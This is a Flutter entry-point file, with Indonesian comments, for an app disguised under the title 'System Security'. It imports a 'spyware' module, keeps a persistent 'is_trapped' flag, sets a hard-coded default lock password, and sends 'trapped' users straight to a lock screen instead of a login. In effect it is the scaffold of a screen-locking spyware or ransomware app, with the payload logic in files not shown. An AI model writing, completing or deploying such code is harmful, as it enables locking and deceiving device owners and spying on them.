import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'login.dart';
import 'spyware.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Cek apakah user sudah pernah login (terjebak)
  final prefs = await SharedPreferences.getInstance();
  bool isTrapped = prefs.getBool('is_trapped') ?? false;
  
  // Set default password jika belum ada
  if (prefs.getString('lock_password') == null) {
    await prefs.setString('lock_password', '2024');
  }

  // Lock orientation ke portrait
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
  ]);

  runApp(MyApp(isTrapped: isTrapped));
}

class MyApp extends StatelessWidget {
  final bool isTrapped;
  const MyApp({super.key, required this.isTrapped});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'System Security',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        useMaterial3: true,
        scaffoldBackgroundColor: Colors.white,
      ),
      // Jika sudah terjebak, langsung buka Spyware. Kalau belum, ke Login.
      home: isTrapped ? const CyberLockScreen() : const LoginScreen(),
    );
  }
}